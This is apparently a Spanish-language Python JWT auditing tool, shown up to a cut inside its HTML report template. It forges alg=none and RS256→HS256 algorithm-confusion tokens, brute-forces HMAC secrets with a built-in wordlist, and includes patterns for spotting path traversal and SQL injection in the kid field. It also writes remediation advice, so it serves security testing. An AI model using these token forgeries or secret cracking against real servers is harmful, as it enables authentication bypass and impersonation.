"""
vamp_jwt_audit.py — Auditor de Tokens JWT
==========================================
© VampSecure Studios — VampSecure Labs Security Research Division

Herramienta de análisis y auditoría de seguridad de JSON Web Tokens (JWT).

Ataques y vectores analizados
------------------------------
1. Decodificación sin verificación
   Lee la cabecera (header) y el payload sin necesitar el secreto ni la clave
   pública. Extrae todos los claims y muestra metadatos del token.

2. Ataque alg=none
   Un servidor vulnerable acepta un token cuya cabecera incluye "alg": "none"
   y cuya firma está vacía. La herramienta comprueba si la cabecera del token
   ya declara alg=none e indica cómo construir el token manipulado.

3. Ataque de confusión de algoritmo RS256 → HS256
   Si un servidor verifica con la clave pública RSA y el cliente puede enviar
   un token firmado con HMAC-SHA256 usando esa clave pública como secreto, el
   servidor lo aceptará pensando que es una firma HMAC válida.
   Si se proporciona --pubkey, la herramienta genera el token manipulado.

4. Fuerza bruta de secreto HMAC (HS256 / HS384 / HS512)
   Prueba secretos de una lista integrada de 200+ secretos comunes y de un
   fichero externo (--wordlist). Si encuentra el secreto, lo reporta como
   CRÍTICO.

5. Análisis de claims
   Valida: expiración (exp), nbf, iat, algoritmo inseguro, iss/aud vacíos,
   roles/scope de alto privilegio, claims PII innecesarios (email, SSN…).

Uso básico
----------
  python3 vamp_jwt_audit.py --token <JWT>
  python3 vamp_jwt_audit.py --token <JWT> --wordlist secretos.txt
  python3 vamp_jwt_audit.py --token <JWT> --pubkey pub.pem
  python3 vamp_jwt_audit.py --file tokens.txt --json resultado.json

Dependencias
------------
  pip install rich>=13.7.0

Dependencias opcionales (cryptography) para RS256→HS256 con --pubkey:
  pip install cryptography>=41.0
"""

# =============================================================================
# METADATOS Y AUTORÍA
# =============================================================================
# © VampSecure Studios — VampSecure Labs Security Research Division
# Todos los derechos reservados. Uso exclusivo en auditorías autorizadas.
# =============================================================================

import argparse
import base64
import hashlib
import hmac
import json
import sys
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from rich.console import Console
from rich.panel import Panel
from rich.table import Table


VERSION   = "1.0.1"
TOOL_NAME = "vamp-jwt-audit"

console = Console()

BANNER = r"""
__   ___   __  __ ___  ___ ___ ___ _   _ ___ ___ _      _   ___ ___ 
\ \ / /_\ |  \/  | _ \/ __| __/ __| | | | _ \ __| |    /_\ | _ ) __|
 \ V / _ \| |\/| |  _/\__ \ _| (__| |_| |   / _|| |__ / _ \| _ \__ \
  \_/_/ \_\_|  |_|_|  |___/___\___|\___/|_|_\___|____/_/ \_\___/___/
  by Antonio Hernandez "Belky" — VampSecure Studios
  vamp-jwt-audit v1.0.1 · JWT Security Auditor
  ────────────────────────────────────────────────────────────────────────
  USO EXCLUSIVO EN AUDITORÍAS AUTORIZADAS · El uso no autorizado es ilegal
"""

# =============================================================================
# SECRETOS COMUNES PARA FUERZA BRUTA
# =============================================================================
# Lista integrada de secretos JWT débiles utilizados frecuentemente en
# aplicaciones de ejemplo, tutoriales y configuraciones por defecto.

_COMMON_SECRETS = [
    "secret", "secret123", "password", "password123", "12345", "123456",
    "qwerty", "test", "test123", "dev", "development", "prod", "production",
    "jwt_secret", "jwt-secret", "jwtsecret", "jwt_key", "mySecret",
    "mysecret", "my_secret", "MySecret", "changeme", "change_me",
    "token", "tokenSecret", "token_secret", "appSecret", "app_secret",
    "api_secret", "apiSecret", "auth", "auth_secret", "authSecret",
    "supersecret", "super_secret", "verysecret", "very_secret",
    "s3cr3t", "p@ssw0rd", "P@ssw0rd", "Pa$$w0rd", "abc123",
    "admin", "admin123", "root", "root123", "toor", "letmein",
    "welcome", "monkey", "dragon", "master", "login", "pass",
    "trustno1", "football", "shadow", "sunshine", "princess",
    "hello", "charlie", "donald", "batman", "superman", "access",
    "passw0rd", "password1", "password!",
    # Secretos de ejemplo de frameworks y tutoriales
    "your-256-bit-secret", "your-secret-key", "your_jwt_secret",
    "YOUR_SECRET_KEY", "MY_SECRET", "JWT_SECRET", "JWT_KEY",
    "CHANGE_THIS", "REPLACE_ME", "PLACEHOLDER",
    "HS256_SECRET", "HS512_SECRET",
    "shhhhh", "keyboard cat", "keyboardcat",
    # Secretos de Docker/Kubernetes/CI defaults
    "k8s-secret", "kubernetes-secret", "docker-secret",
    "ci_secret", "CI_SECRET", "GITHUB_SECRET",
    # Vacío
    "", " ",
    # Base64 commons
    "c2VjcmV0", "dGVzdA==", "cGFzc3dvcmQ=",
]

# =============================================================================
# ESTRUCTURAS DE DATOS
# =============================================================================

@dataclass
class JWTComponents:
    """Componentes decodificados de un JWT."""
    raw:     str
    header:  Dict  = field(default_factory=dict)
    payload: Dict  = field(default_factory=dict)
    sig_b64: str   = ""
    parts:   List  = field(default_factory=list)
    error:   Optional[str] = None


@dataclass
class Finding:
    """Hallazgo de seguridad en el token."""
    severity:    str        # CRITICAL / HIGH / MEDIUM / LOW / INFO
    title:       str
    description: str
    evidence:    str = ""
    remediation: str = ""

    @property
    def order(self) -> int:
        return {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}.get(self.severity, 99)


@dataclass
class AuditResult:
    """Resultado completo de la auditoría de un JWT."""
    token:      str
    components: Optional[JWTComponents] = None
    findings:   List[Finding]           = field(default_factory=list)
    cracked_secret: Optional[str]       = None
    alg_none_token: Optional[str]       = None
    rs256_hs256_token: Optional[str]    = None

    @property
    def max_severity(self) -> str:
        if not self.findings:
            return "INFO"
        return self.findings[0].severity


# =============================================================================
# DECODIFICACIÓN JWT
# =============================================================================

def _b64url_decode(s: str) -> bytes:
    """Decodifica un segmento base64url (sin padding estricto)."""
    s = s.replace("-", "+").replace("_", "/")
    pad = len(s) % 4
    if pad:
        s += "=" * (4 - pad)
    return base64.b64decode(s)


def _b64url_encode(data: bytes) -> str:
    """Codifica bytes en base64url sin padding."""
    return base64.b64encode(data).decode().replace("+", "-").replace("/", "_").rstrip("=")


def decode_jwt(token: str) -> JWTComponents:
    """
    Decodifica un JWT en sus tres componentes sin verificar la firma.

    Acepta tokens con o sin el prefijo 'Bearer '.

    Parámetros
    ----------
    token : str  — El token JWT en formato xxx.yyy.zzz

    Retorna
    -------
    JWTComponents con header, payload y firma decodificados o con error si
    el formato es inválido.
    """
    token = token.strip()
    if token.lower().startswith("bearer "):
        token = token[7:].strip()

    parts = token.split(".")
    if len(parts) < 2:
        return JWTComponents(raw=token, error=f"Formato inválido: se esperan 3 partes, encontradas {len(parts)}")

    try:
        header  = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
        sig_b64 = parts[2] if len(parts) > 2 else ""
        return JWTComponents(raw=token, header=header, payload=payload, sig_b64=sig_b64, parts=parts)
    except Exception as exc:
        return JWTComponents(raw=token, error=f"Error decodificando token: {exc}")


# =============================================================================
# ATAQUE ALG=NONE
# =============================================================================

def craft_alg_none_token(components: JWTComponents) -> str:
    """
    Construye un token manipulado con alg=none y firma vacía.

    El servidor sólo acepta este token si no valida correctamente el algoritmo.

    Parámetros
    ----------
    components : JWTComponents  — Token decodificado original

    Retorna
    -------
    str  — El token manipulado con alg=none
    """
    new_header  = {**components.header, "alg": "none"}
    header_enc  = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
    payload_enc = _b64url_encode(json.dumps(components.payload, separators=(",", ":")).encode())
    return f"{header_enc}.{payload_enc}."


# =============================================================================
# ATAQUE RS256 → HS256 (CONFUSIÓN DE ALGORITMO)
# =============================================================================

def craft_rs256_hs256_token(components: JWTComponents, pubkey_pem: str) -> Optional[str]:
    """
    Genera un token HS256 firmado con la clave pública RSA como secreto HMAC.

    Ataque de confusión de algoritmo: el servidor verifica JWT con una clave
    pública RSA (RS256); si acepta también HS256, un atacante puede firmar con
    la clave pública (conocida) como si fuera un secreto HMAC.

    Requiere la dependencia opcional `cryptography`.

    Parámetros
    ----------
    components  : JWTComponents  — Token original decodificado
    pubkey_pem  : str            — Clave pública RSA en formato PEM

    Retorna
    -------
    str  — Token manipulado firmado con HS256+pubkey, o None si falla
    """
    new_header  = {**components.header, "alg": "HS256"}
    header_enc  = _b64url_encode(json.dumps(new_header, separators=(",", ":")).encode())
    payload_enc = _b64url_encode(json.dumps(components.payload, separators=(",", ":")).encode())
    message     = f"{header_enc}.{payload_enc}".encode()

    sig = hmac.new(pubkey_pem.encode(), message, hashlib.sha256).digest()
    return f"{header_enc}.{payload_enc}.{_b64url_encode(sig)}"


# =============================================================================
# FUERZA BRUTA DE SECRETO HMAC
# =============================================================================

def brute_force_secret(
    components: JWTComponents,
    extra_wordlist: Optional[List[str]] = None,
) -> Optional[str]:
    """
    Intenta recuperar el secreto HMAC de un token HS256/HS384/HS512.

    Prueba primero la lista integrada de secretos comunes y luego los
    del fichero externo (si se proporciona). Para cada candidato calcula
    la firma HMAC con el algoritmo del token y la compara con la firma real.

    Parámetros
    ----------
    components    : JWTComponents  — Token decodificado
    extra_wordlist: List[str]      — Secretos adicionales de un fichero externo

    Retorna
    -------
    str  — El secreto encontrado, o None si no se ha encontrado
    """
    alg = components.header.get("alg", "").upper()
    if alg not in ("HS256", "HS384", "HS512"):
        return None

    hashfn_map = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}
    hashfn = hashfn_map[alg]

    if len(components.parts) < 3 or not components.sig_b64:
        return None

    try:
        expected_sig = _b64url_decode(components.sig_b64)
    except Exception:
        return None

    message = f"{components.parts[0]}.{components.parts[1]}".encode()
    candidates = list(_COMMON_SECRETS) + (extra_wordlist or [])

    for secret in candidates:
        try:
            sig = hmac.new(secret.encode("utf-8", errors="replace"), message, hashfn).digest()
            if hmac.compare_digest(sig, expected_sig):
                return secret
        except Exception:
            continue

    return None


# =============================================================================
# ANÁLISIS DE CLAIMS
# =============================================================================

def analyze_claims(components: JWTComponents) -> List[Finding]:
    """
    Analiza los claims del payload en busca de problemas de seguridad.

    Checks implementados
    --------------------
    · Expiración: exp ausente, ya expirado, vigencia excesiva (> 24h)
    · nbf en el futuro (token no válido aún)
    · iat ausente o en el futuro
    · iss / aud vacíos o ausentes
    · Roles/scope de alto privilegio (admin, root, superuser…)
    · Claims PII innecesarios (email, SSN, teléfono en el payload)
    · kid con path traversal o inyección SQL

    Parámetros
    ----------
    components : JWTComponents  — Token decodificado

    Retorna
    -------
    List[Finding]  — Lista de hallazgos de claims
    """
    now = int(time.time())
    p   = components.payload
    findings: List[Finding] = []

    # ── Expiración ────────────────────────────────────────────────────────────
    exp = p.get("exp")
    if exp is None:
        findings.append(Finding(
            severity    = "HIGH",
            title       = "Claim 'exp' ausente — token sin expiración",
            description = "El token no tiene claim de expiración (exp). Un token sin expiración "
                          "permanece válido indefinidamente y no puede ser invalidado por rotación.",
            remediation = "Añadir el claim 'exp' con una vigencia máxima acorde al caso de uso "
                          "(p. ej. 15 minutos para tokens de sesión, 1 hora para API keys de corta vida).",
        ))
    elif isinstance(exp, (int, float)) and exp < now:
        elapsed = now - int(exp)
        findings.append(Finding(
            severity    = "MEDIUM",
            title       = "Token EXPIRADO",
            description = f"El token expiró hace {elapsed} segundos (exp={exp}, ahora={now}). "
                          "Si el servidor lo acepta, hay un bug de validación de expiración.",
            evidence    = f"exp={exp}  now={now}  delta={elapsed}s",
            remediation = "Verificar que el servidor rechaza tokens expirados. "
                          "Implementar validación de 'exp' con margen de reloj máximo de 60 segundos.",
        ))
    elif isinstance(exp, (int, float)):
        ttl = int(exp) - now
        if ttl > 86400:
            findings.append(Finding(
                severity    = "LOW",
                title       = f"Vigencia excesiva del token: {ttl // 3600:.0f} horas",
                description = f"El token tiene una vigencia de {ttl // 3600:.0f} horas. "
                              "Una vigencia larga aumenta el riesgo de uso indebido si el token es comprometido.",
                evidence    = f"exp={exp}  TTL restante={ttl}s ({ttl // 3600:.0f}h)",
                remediation = "Reducir la vigencia del token: 15 min para sesiones de usuario, "
                              "1h para API keys, 24h máximo para tokens de refresh.",
            ))

    # ── nbf ───────────────────────────────────────────────────────────────────
    nbf = p.get("nbf")
    if nbf and isinstance(nbf, (int, float)) and int(nbf) > now + 60:
        findings.append(Finding(
            severity    = "MEDIUM",
            title       = "Token con nbf en el futuro — no válido todavía",
            description = f"El claim 'nbf' (not before) es {int(nbf) - now} segundos en el futuro. "
                          "El token no debería ser válido aún.",
            evidence    = f"nbf={nbf}  now={now}  delta={int(nbf) - now}s",
            remediation = "Si el servidor acepta este token antes de nbf, hay un bug de validación. "
                          "Verificar que la lógica de validación comprueba: now >= nbf.",
        ))

    # ── iss / aud ─────────────────────────────────────────────────────────────
    if not p.get("iss"):
        findings.append(Finding(
            severity    = "LOW",
            title       = "Claim 'iss' (issuer) ausente",
            description = "Sin claim iss no es posible verificar que el token fue emitido por "
                          "el servidor esperado, facilitando ataques de replay entre servicios.",
            remediation = "Añadir el claim 'iss' con el identificador único del emisor y validarlo en cada petición.",
        ))
    if not p.get("aud"):
        findings.append(Finding(
            severity    = "LOW",
            title       = "Claim 'aud' (audience) ausente",
            description = "Sin claim aud el token puede ser reutilizado en otros servicios "
                          "que confíen en el mismo issuer.",
            remediation = "Añadir el claim 'aud' con el identificador del servicio receptor y validarlo.",
        ))

    # ── Roles / scope de alto privilegio ─────────────────────────────────────
    PRIVILEGED_ROLES = {"admin", "root", "superuser", "super_user", "superadmin",
                        "administrator", "owner", "god", "system", "internal"}
    for claim in ("role", "roles", "scope", "permissions", "groups", "authorities"):
        val = p.get(claim)
        if not val:
            continue
        val_lower = json.dumps(val).lower()
        found = [r for r in PRIVILEGED_ROLES if r in val_lower]
        if found:
            findings.append(Finding(
                severity    = "HIGH",
                title       = f"Privilegio elevado en claim '{claim}': {found}",
                description = f"El claim '{claim}' contiene roles/scopes de alto privilegio: {found}. "
                              "Si el servidor no valida estos claims contra la BD, pueden ser manipulados.",
                evidence    = f"{claim}={json.dumps(val)!r}",
                remediation = "Los roles/permisos deben resolverse siempre desde la BD en cada petición, "
                              "nunca confiar exclusivamente en los claims del token.",
            ))

    # ── Claims PII en el payload ──────────────────────────────────────────────
    PII_CLAIMS = {"email", "phone", "ssn", "tax_id", "dni", "nif", "address",
                  "date_of_birth", "dob", "credit_card", "ip_address"}
    pii_found = [c for c in p.keys() if c.lower() in PII_CLAIMS]
    if pii_found:
        findings.append(Finding(
            severity    = "MEDIUM",
            title       = f"Datos PII en payload JWT: {pii_found}",
            description = f"El payload contiene claims con datos personales ({pii_found}). "
                          "El payload JWT es sólo codificado en base64, no cifrado, y puede ser leído "
                          "por cualquier intermediario con acceso al token.",
            evidence    = f"Claims PII detectados: {pii_found}",
            remediation = "Minimizar la información en el payload. Usar un claim opaco (jti/sub) "
                          "como referencia y resolver datos sensibles en el servidor. "
                          "Si es necesario incluir PII, usar JWE (JSON Web Encryption) en lugar de JWT.",
        ))

    # ── kid con path traversal / inyección ────────────────────────────────────
    kid = components.header.get("kid", "")
    if kid and any(c in str(kid) for c in ("../", "..\\", ";", "' OR", "/*", "UNION")):
        findings.append(Finding(
            severity    = "CRITICAL",
            title       = f"Claim 'kid' con posible path traversal / inyección: {kid!r}",
            description = "El claim 'kid' (key ID) contiene caracteres que pueden usarse para path "
                          "traversal o inyección SQL si el servidor usa kid para seleccionar la clave "
                          "de verificación desde el sistema de ficheros o la BD.",
            evidence    = f"kid={kid!r}",
            remediation = "Validar que 'kid' es un identificador alfanumérico fijo de una lista blanca. "
                          "Nunca usar kid directamente en rutas de ficheros o consultas SQL.",
        ))

    return findings


# =============================================================================
# ANÁLISIS DE CABECERA
# =============================================================================

def analyze_header(components: JWTComponents) -> List[Finding]:
    """
    Analiza la cabecera del JWT en busca de algoritmos inseguros y configuraciones débiles.

    Parámetros
    ----------
    components : JWTComponents  — Token decodificado

    Retorna
    -------
    List[Finding]  — Lista de hallazgos de cabecera
    """
    findings: List[Finding] = []
    alg = components.header.get("alg", "")

    if alg.lower() == "none":
        findings.append(Finding(
            severity    = "CRITICAL",
            title       = "Algoritmo 'none' declarado en la cabecera",
            description = "El token declara alg=none, lo que significa que no tiene firma. "
                          "Si el servidor lo acepta, cualquier atacante puede modificar el payload "
                          "y eliminar la firma sin que sea detectado.",
            evidence    = f"alg={alg!r}",
            remediation = "El servidor debe rechazar EXPLÍCITAMENTE tokens con alg=none. "
                          "Usar una lista blanca de algoritmos aceptables (p. ej. solo HS256 o RS256).",
        ))

    elif alg.upper() in ("HS256", "HS384", "HS512"):
        findings.append(Finding(
            severity    = "INFO",
            title       = f"Algoritmo simétrico {alg} — validar longitud del secreto",
            description = f"Se usa {alg} (HMAC). La seguridad depende de la longitud y entropía del secreto. "
                          "Un secreto débil o de diccionario puede recuperarse con fuerza bruta.",
            remediation = f"Usar un secreto aleatorio de al menos 256 bits (32 bytes) para {alg}. "
                          "Para mayor seguridad asimétrica, considerar RS256/ES256 con claves de 2048/256 bits.",
        ))

    elif alg.upper() in ("RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256", "PS384", "PS512"):
        findings.append(Finding(
            severity    = "INFO",
            title       = f"Algoritmo asimétrico {alg} — verificar vulnerabilidad RS256→HS256",
            description = f"Se usa {alg} (clave pública/privada). Verificar si el servidor acepta HS256 "
                          "firmado con la clave pública como secreto (ataque de confusión de algoritmo).",
            remediation = "Fijar el algoritmo permitido en la configuración del servidor y rechazar "
                          "cualquier token cuyo 'alg' difiera del esperado.",
        ))

    # jku / x5u — key injection via URL
    for claim in ("jku", "x5u"):
        val = components.header.get(claim)
        if val:
            findings.append(Finding(
                severity    = "CRITICAL",
                title       = f"Claim '{claim}' presente — posible inyección de clave JWT",
                description = f"La cabecera incluye '{claim}={val}'. Si el servidor descarga la clave "
                              f"desde esta URL para verificar el token, un atacante puede apuntar a un "
                              f"servidor controlado por él y emitir tokens arbitrarios.",
                evidence    = f"{claim}={val!r}",
                remediation = f"El servidor nunca debe seguir URLs en '{claim}' de forma automática. "
                              "Fijar la URL/clave en la configuración interna del servidor.",
            ))

    # jwk inline
    if "jwk" in components.header:
        findings.append(Finding(
            severity    = "CRITICAL",
            title       = "Claim 'jwk' inline — clave incrustada en el token",
            description = "La cabecera incluye una clave JWK inline. Un atacante puede incluir su propia "
                          "clave pública en el header y firmar el token con la clave privada correspondiente. "
                          "Si el servidor usa la clave del header sin verificarla contra una fuente de confianza, "
                          "el atacante puede forjar tokens válidos.",
            evidence    = "jwk=" + repr(json.dumps(components.header["jwk"]))[:80] + "...",
            remediation = "Ignorar el claim 'jwk' del header y usar únicamente claves precargadas "
                          "de la configuración del servidor.",
        ))

    return findings


# =============================================================================
# MOTOR PRINCIPAL DE AUDITORÍA
# =============================================================================

def audit_token(
    token: str,
    wordlist: Optional[List[str]] = None,
    pubkey_pem: Optional[str] = None,
) -> AuditResult:
    """
    Ejecuta la auditoría completa de un JWT.

    Fases
    -----
    1. Decodificación sin verificación
    2. Análisis de cabecera (algoritmo, jku/x5u/jwk)
    3. Análisis de claims (exp, nbf, iat, roles, PII, kid)
    4. Construcción de token alg=none manipulado
    5. Fuerza bruta de secreto HMAC (wordlist integrada + externa)
    6. Construcción de token RS256→HS256 (si --pubkey)

    Parámetros
    ----------
    token     : str           — El token JWT a auditar
    wordlist  : List[str]     — Secretos adicionales para fuerza bruta
    pubkey_pem: str           — Clave pública RSA en PEM para RS256→HS256

    Retorna
    -------
    AuditResult  — Resultado completo de la auditoría
    """
    result = AuditResult(token=token)

    # Fase 1: Decodificación
    components = decode_jwt(token)
    result.components = components
    if components.error:
        result.findings.append(Finding(
            severity="CRITICAL",
            title="Error de decodificación — token malformado",
            description=components.error,
        ))
        return result

    # Fase 2: Análisis de cabecera
    result.findings.extend(analyze_header(components))

    # Fase 3: Análisis de claims
    result.findings.extend(analyze_claims(components))

    # Fase 4: Token alg=none
    result.alg_none_token = craft_alg_none_token(components)

    # Fase 5: Fuerza bruta de secreto HMAC
    alg = components.header.get("alg", "").upper()
    if alg.startswith("HS"):
        cracked = brute_force_secret(components, extra_wordlist=wordlist)
        if cracked is not None:
            result.cracked_secret = cracked
            result.findings.append(Finding(
                severity    = "CRITICAL",
                title       = f"Secreto HMAC descubierto por fuerza bruta: {cracked!r}",
                description = f"El secreto del token HS256/HS384/HS512 ha sido recuperado mediante "
                              f"un ataque de diccionario. Secreto: {cracked!r}. "
                              "Cualquier atacante con el token puede forjar nuevos tokens arbitrarios.",
                evidence    = f"Secreto: {cracked!r}  Algoritmo: {alg}",
                remediation = "Cambiar el secreto inmediatamente por uno aleatorio de alta entropía "
                              "(mínimo 32 bytes = 256 bits). "
                              "Invalidar todos los tokens emitidos con el secreto comprometido. "
                              "Rotación del secreto requiere reinicio del servicio o recarga de configuración.",
            ))

    # Fase 6: RS256 → HS256 (si se provee clave pública)
    if pubkey_pem and alg in ("RS256", "RS384", "RS512"):
        manipulated = craft_rs256_hs256_token(components, pubkey_pem)
        if manipulated:
            result.rs256_hs256_token = manipulated
            result.findings.append(Finding(
                severity    = "HIGH",
                title       = "Token RS256→HS256 manipulado generado",
                description = "Se ha generado un token HS256 firmado con la clave pública RSA como secreto. "
                              "Si el servidor acepta este token, es vulnerable al ataque de confusión de algoritmo.",
                evidence    = f"Token manipulado: {manipulated[:80]}...",
                remediation = "Fijar el algoritmo aceptado en el servidor (sólo RS256, nunca HS256 con la misma clave). "
                              "Usar la opción 'algorithms=[\"RS256\"]' en la librería JWT del servidor.",
            ))

    # Ordenar hallazgos por severidad
    result.findings.sort(key=lambda f: f.order)
    return result


# =============================================================================
# SALIDAS
# =============================================================================

SEVERITY_COLOR = {
    "CRITICAL": "bold red",
    "HIGH":     "bold yellow",
    "MEDIUM":   "bold magenta",
    "LOW":      "cyan",
    "INFO":     "green",
}

SEVERITY_STYLE_HTML = {
    "CRITICAL": "#ff2222",
    "HIGH":     "#ffcc00",
    "MEDIUM":   "#cc44ff",
    "LOW":      "#4af",
    "INFO":     "#4caf50",
}


def print_token_detail(result: AuditResult) -> None:
    """Imprime en consola el detalle completo de un AuditResult."""
    components = result.components
    if not components or components.error:
        console.print(f"[bold red]  Error: {components.error if components else 'token inválido'}[/]")
        return

    # Tabla de claims del header
    h_table = Table(title="JWT Header", show_lines=False, border_style="dim")
    h_table.add_column("Claim", style="cyan", width=12)
    h_table.add_column("Valor")
    for k, v in components.header.items():
        h_table.add_row(k, json.dumps(v) if not isinstance(v, str) else v)
    console.print(h_table)

    # Tabla de claims del payload
    p_table = Table(title="JWT Payload", show_lines=False, border_style="dim")
    p_table.add_column("Claim", style="cyan", width=18)
    p_table.add_column("Valor")
    p_table.add_column("Info", style="dim")
    now = int(time.time())
    for k, v in components.payload.items():
        info = ""
        if k in ("exp", "nbf", "iat") and isinstance(v, (int, float)):
            import datetime
            dt = datetime.datetime.utcfromtimestamp(int(v))
            info = dt.strftime("%Y-%m-%d %H:%M:%S UTC")
            if k == "exp":
                delta = int(v) - now
                info += f"  ({'en ' + str(abs(delta)) + 's' if delta > 0 else 'EXPIRADO ' + str(abs(delta)) + 's'}"
                info += ")"
        p_table.add_row(k, json.dumps(v) if not isinstance(v, str) else v, info)
    console.print(p_table)

    # Firma
    if components.sig_b64:
        console.print(f"  [dim]Firma (base64url):[/] {components.sig_b64[:40]}{'...' if len(components.sig_b64) > 40 else ''}")

    # Hallazgos
    if result.findings:
        console.print("\n  [bold]HALLAZGOS:[/]")
    for f in result.findings:
        sev_color = SEVERITY_COLOR.get(f.severity, "white")
        console.print(Panel(
            f"{f.description}"
            + (f"\n\n[dim]Evidencia:[/] {f.evidence}" if f.evidence else "")
            + (f"\n\n[dim]Remediación:[/] {f.remediation}" if f.remediation else ""),
            title=f"[{sev_color}][{f.severity}][/] {f.title}",
            border_style="red" if f.severity == "CRITICAL" else "yellow" if f.severity == "HIGH" else "dim",
        ))

    # Token alg=none
    if result.alg_none_token:
        console.print(f"\n  [dim]Token alg=none (para prueba manual):[/]")
        console.print(f"  [dim]{result.alg_none_token[:100]}...[/]" if len(result.alg_none_token) > 100 else f"  [dim]{result.alg_none_token}[/]")

    # Secreto cracked
    if result.cracked_secret is not None:
        console.print(f"\n  [bold red]⚠ Secreto HMAC encontrado:[/] [bold]{result.cracked_secret!r}[/]")

    # RS256→HS256
    if result.rs256_hs256_token:
        console.print(f"\n  [bold yellow]Token RS256→HS256 generado (probar en el servidor):[/]")
        console.print(f"  {result.rs256_hs256_token[:80]}...")


def to_json(results: List[AuditResult]) -> str:
    """Serializa los resultados de auditoría a JSON."""
    out = []
    for r in results:
        out.append({
            "token":      r.token[:40] + "..." if len(r.token) > 40 else r.token,
            "max_severity": r.max_severity,
            "header":     r.components.header if r.components else {},
            "payload":    r.components.payload if r.components else {},
            "findings":   [
                {"severity": f.severity, "title": f.title,
                 "description": f.description, "evidence": f.evidence,
                 "remediation": f.remediation}
                for f in r.findings
            ],
            "cracked_secret":    r.cracked_secret,
            "alg_none_token":    r.alg_none_token,
            "rs256_hs256_token": r.rs256_hs256_token,
        })
    return json.dumps({"generated_by": TOOL_NAME, "version": VERSION, "results": out},
                       indent=2, ensure_ascii=False)


def to_html(results: List[AuditResult]) -> str:
    """Genera un informe HTML con tema oscuro."""
    import datetime as _dt

    def esc(s: str) -> str:
        return (str(s).replace("&", "&amp;").replace("<", "&lt;")
                .replace(">", "&gt;").replace('"', "&quot;"))

    ts = _dt.datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")

    body = ""
    for r in results:
        tok_preview = r.token[:40] + "..." if len(r.token) > 40 else r.token
        if not r.components or r.components.error:
            body += f"<section><h2 class='tok-error'>{esc(tok_preview)}</h2><p class='error'>Error: {esc(r.components.error if r.components else 'inválido')}</p></section>"
            continue

        # Claims tables
        h_rows = "".join(
            f"<tr><td class='claim'>{esc(k)}</td><td><code>{esc(json.dumps(v) if not isinstance(v, str) else v)}</code></td></tr>"
            for k, v in r.components.header.items()
        )
        p_rows = "".join(
            f"<tr><td class='claim'>{esc(k)}</td><td><code>{esc(json.dumps(v) if not isinstance(v, str) else v)}</code></td></tr>"
            for k, v in r.components.payload.items()
        )

        # Findings
        finds_html = ""
        for f in r.findings:
            col = SEVERITY_STYLE_HTML.get(f.severity, "#aaa")
            finds_html += (
                f"<div class='finding'><span class='sev' style='color:{col}'>{esc(f.severity)}</span>"
                f" <b>{esc(f.title)}</b>"
                f"<p>{esc(f.description)}</p>"
                + (f"<p class='evidence'><b>Evidencia:</b> {esc(f.evidence)}</p>" if f.evidence else "")
                + (f"<p class='remediation'><b>Remediación:</b> {esc(f.remediation)}</p>" if f.remediation else "")
                + "</div>"
            )

        # Manipulated tokens
        manip = ""
        if r.alg_none_token:
            manip += f"<h4>Token alg=none</h4><pre class='token-box'>{esc(r.alg_none_token)}</pre>"
        if r.cracked_secret is not None:
            manip += f"<p class='cracked'>⚠ Secreto HMAC encontrado: <code>{esc(repr(r.cracked_secret))}</code></p>"
        if r.rs256_hs256_token:
            manip += f"<h4>Token RS256→HS256</h4><pre class='token-box'>{esc(r.rs256_hs256_token)}</pre>"

        badge_color = SEVERITY_STYLE_HTML.get(r.max_severity, "#aaa")
        body += (
            f"<section><h2 class='tok-header'>{esc(tok_preview)}</h2>"
            f"<div class='severity-badge' style='border-color:{badge_color}'>"
            f"  {esc(r.max_severity)}</div>"
            f"<h3>Header</h3><table class='claims'><tbody>{h_rows}</tbody></table>"
            f"<h3>Payload</h3><table class='claims'><tbody>{p_rows}</tbody></table>"
            + (f"<h3>Hallazgos ({len(r.findings)})</h3>{finds_html}" if r.findings else "")
            + (f"<h3>Tokens manipulados</h3>{manip}" if manip else "")
            + "</section>"
        )

    return f"""<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<title>VampSecure Labs — JWT Audit</title>
<style>
  *{{box-sizing:border-box;margin:0;padding:0}}
  body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
        background:#0a0a0a;color:#e0e0e0;padding:2rem;}}
  header{{border-bottom:2px solid #9c27b0;padding-bottom:1.5rem;margin-bottom:2rem;}}
  .brand{{font-size:1.4rem;font-weight:700;color:#9c27b0;}}
  .meta-bar{{color:#888;font-size:.85rem;margin-top:.4rem;}}
  section{{background:#111;border:1px solid #1e1e1e;border-radius:8px;
           padding:1.5rem;margin-bottom:1.5rem;}}
  h2.tok-header{{color:#9c27b0;font-size:1rem;font-family:monospace;margin-bottom:.75rem;
                 word-break:break-all;}}
  h2.tok-error{{color:#ff4444;}}
  h3{{color:#ce93d8;font-size:.9rem;text-transform:uppercase;letter-spacing:.06em;
      margin:1rem 0 .4rem;}}
  h4{{color:#aaa;font-size:.85rem;margin:.75rem 0 .3rem;}}
  table.claims{{width:100%;border-collapse:collapse;margin-bottom:.75rem;}}
  table.claims td{{padding:.35rem .6rem;border-bottom:1px solid #1a1a1a;
                   font-size:.85rem;vertical-align:top;}}
  td.claim{{color:#ce93d8;width:140px;font-weight:600;}}
  code{{background:#0d0d0d;padding:.1rem .3rem;border-radius:3px;color:#9ecbff;
        font-size:.82rem;word-break:break-all;}}
  .finding{{border-left:3px solid #444;padding:.6rem 1rem;margin:.5rem 0;
            background:#0d0d0d;border-radius:0 4px 4px 0;}}
  .finding .sev{{font-weight:700;font-size:.85rem;text-transform:uppercase;margin-right:.5rem;}}
  .finding p{{font-size:.85rem;margin-top:.4rem;color:#ccc;}}
  .evidence{{color:#888;font-family:monospace;font-size:.8rem;}}
  .remediation{{color:#4caf50;font-size:.82rem;}}
  .severity-badge{{display:inline-block;border:2px solid #aaa;padding:.2rem .6rem;
                   border-radius:4px;font-size:.85rem;font-weight:700;margin-bottom:.75rem;}}
  .cracked{{color:#ff4444;font-weight:700;padding:.5rem;background:#2a0000;
            border-radius:4px;margin:.5rem 0;}}
  pre.token-box{{background:#0d0d0d;padding:.75rem;border-radius:4px;font-size:.75rem;
